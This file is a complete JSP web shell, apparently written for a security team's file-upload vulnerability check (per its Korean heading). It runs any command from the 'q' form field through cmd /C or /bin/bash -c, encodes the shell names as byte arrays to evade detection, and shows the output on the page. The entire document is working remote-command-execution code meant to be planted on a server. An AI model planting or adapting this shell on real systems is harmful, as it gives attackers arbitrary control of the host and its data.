/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* */
/* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* */
/* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* */









































<%@ page pageEncoding="utf-8"%> 
<%@ page import="java.util.Scanner" %> 

/* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* */

<HTML> 
<title>SecurityTEAM</title> 
<BODY bgcolor="#111111"> 
	<center style="color:white;"><H3>SecurityTEAM</H3></center> 
<FORM METHOD="POST" NAME="form" ACTION="#"> 

/* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* */
	 
	<br> 
    <center> 
		<img src="https://www.telefonica.com/en/wp-content/uploads/sites/5/2023/11/Cybersecurity-policies-what-is-coming-next.jpg?w=1200&h=673&crop=1" width="700", height="300":><br> 
		<INPUT style="text-align: center"; TYPE="text" NAME="q"> 
		<INPUT style="text-align: center"; TYPE="submit" VALUE="SEND"> 
	</center> 
     
</FORM> 
 
####### 진단 팀 파일 업로드 취약점 점검 #######

 /* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* */
 
<% 
    String op="Got Nothing"; 
    String query = request.getParameter("q"); 
    String fileSeparator = String.valueOf(java.io.File.separatorChar); 
    Boolean isWin; 
    if(fileSeparator.equals("\\")){ 
        isWin = true; 
    }else{ 
        isWin = false; 
    } 
 
    if (query != null) { 
        ProcessBuilder pb; 
        if(isWin) { 
            pb = new ProcessBuilder(new String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), query); 
        }else{ 
            pb = new ProcessBuilder(new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), query); 
        } 
        Process process = pb.start(); 
        Scanner sc = new Scanner(process.getInputStream()).useDelimiter("\\A"); 
        op = sc.hasNext() ? sc.next() : op; 
        sc.close(); 
    } 
%> 


/* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* */
 
<PRE> 
    <center style="color:white;"><%= op %>></center> 
</PRE> 
</BODY> 
</HTML>
